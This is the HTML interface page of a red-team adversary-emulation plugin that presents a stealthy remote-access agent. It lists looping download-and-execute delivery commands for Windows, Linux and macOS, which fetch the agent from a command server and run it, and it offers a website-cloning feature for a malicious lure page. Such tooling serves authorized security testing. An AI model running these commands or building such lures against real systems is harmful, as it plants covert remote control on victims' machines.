<script src="/gui/js/shared.js"></script>
<html>
    <head>
        <title>Sandcat | 54ndc47</title>
        <link rel="shortcut icon" type="image/png" href="/gui/img/favicon.png"/>
        <link rel="stylesheet" href="/gui/css/shared.css">
        <link rel="stylesheet" href="/gui/css/navbar.css">
        <link rel="stylesheet" href="/sandcat/css/basic.css">
    </head>
    <body>
    <center style="margin-bottom: 100px">
        <div class="topnav">
          <a href="/">Home</a>
          <a class="active" href="/plugin/sandcat/gui">Sandcat</a>
          <div class="topnav-right">
            <a href="https://github.com/mitre/caldera/wiki" target="_blank">Docs</a>
            <a href="/logout">Logout</a>
          </div>
        </div>
        <div>
            <div id="sandcat-blocks" class="row-canvas">
                <div class="section-profile">
                    <div class="row">
                        <div class="column prints" style="flex:35%">
                            <img id="pawprint" style="filter:invert(var(--invert-percentage))" src="/sandcat/img/print.png">
                        </div>
                        <div class="column" style="flex:65%;text-align:left">
                            <h1 style="margin-top:-20px">54ndc47</h1>
                            <h2 style="margin-top:-85px">coordinated access trojan (CAT)</h2>
                            <p style="width: 75%;font-size:14px;">
                                A sandcat is a desert cat that leaves no footprint. In that vein,
                                54ndc47 is an agent designed to run without detection on any host operating system.
                                It intentionally blends into the environment and executes CALDERA operations.
                            </p>
                            <b><p style="font-size:14px;color:gold">&#9888; Use an initial access option below to deliver the agent to target hosts.</p></b>
                        </div>
                    </div>
                </div>

                <!-- Access #1 -->

                <div class="section-profile">
                    <div class="row">
                        <div class="column section-border" style="flex:25%">
                            <img src="/sandcat/img/access.png">
                            <h4>Initial Access #1</h4>
                            <p class="section-description">
                                Copy and paste one of the delivery commands into a terminal window to start a copy of the CAT.
                            </p>
                            <button class="button-success cat-btn" onclick="show('delivery-windows')">Windows</button>
                            <button class="button-success cat-btn" onclick="show('delivery-linux')">Linux</button>
                            <button class="button-success cat-btn" onclick="show('delivery-darwin')">MacOS</button>
                        </div>
                        <div class="column" style="flex:75%">
                            <code id="delivery-windows" class="delivery" style="display: none">
                                <pre>while($true){$url="http://localhost:8888/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $output="C:\Users\Public\sandcat.exe";$wc.DownloadFile($url,$output); C:\Users\Public\sandcat.exe -server http://localhost:8888 -group my_group; sleep 60}</pre>
                            </code>
                            <code id="delivery-linux" class="delivery" style="display: none">
                                <pre>while true; do curl -sk -X POST -H 'file:sandcat.go' -H 'platform:linux' http://localhost:8888/file/download > /tmp/sandcat-linux && chmod +x /tmp/sandcat-linux && /tmp/sandcat-linux -server http://localhost:8888 -group my_group; sleep 60; done</pre>
                            </code>
                            <code id="delivery-darwin" class="delivery" style="display: none">
                                <pre>while true; do curl -sk -X POST -H 'file:sandcat.go' -H 'platform:darwin' http://localhost:8888/file/download > /tmp/sandcat-darwin && chmod +x /tmp/sandcat-darwin && /tmp/sandcat-darwin -server http://localhost:8888 -group my_group; sleep 60; done</pre>
                            </code>
                        </div>
                    </div>
                </div>

                <!-- Access #2 -->

                <div id="clone" class="section-profile">
                    <div class="row">
                        <div class="column section-border" style="flex:25%">
                            <img src="/sandcat/img/access.png">
                            <h4>Initial Access #2</h4>
                            <p class="section-description">
                                Have each targeted machine navigate to our malicious web page. Then start the downloaded
                                54ndc47 agent. Use our sample malicious web page or overwrite it using the website
                                cloning button below.
                            </p>
                            <input id="cloneNew" placeholder="Enter a url"/>
                            <button type="button" class="button-success" onclick="cloneWebsite()">Clone</button>
                        </div>
                        <div class="column malicious-link" style="flex:75%">
                            <a href="/plugin/sandcat/malicious" target="_blank">
                                <img src="/sandcat/img/arrow.png"/>
                            </a>
                        </div>
                    </div>
                </div>

            </div>
        </div>
        </center>
    </body>
    <script src="/gui/jquery/jquery.js"></script>
    <script>
        function show(identity) {
            let myClasses = document.querySelectorAll('.delivery'), i = 0, l = myClasses.length;
            for (i; i < l; i++) {
              myClasses[i].style.display = 'none';
            }
            document.getElementById(identity).style.display = "block";
        }
        function cloneWebsite(){
            let section = $('#clone');
            section.prop('disabled', true).css('opacity', 0.5);
            $.ajax({
               url: '/plugin/sandcat/clone?url=' + document.getElementById("cloneNew").value,
               type: 'GET',
               success: function(data, status, options) { section.prop('disabled', false).css('opacity', 1.0); }
            });

        }
    </script>
</html>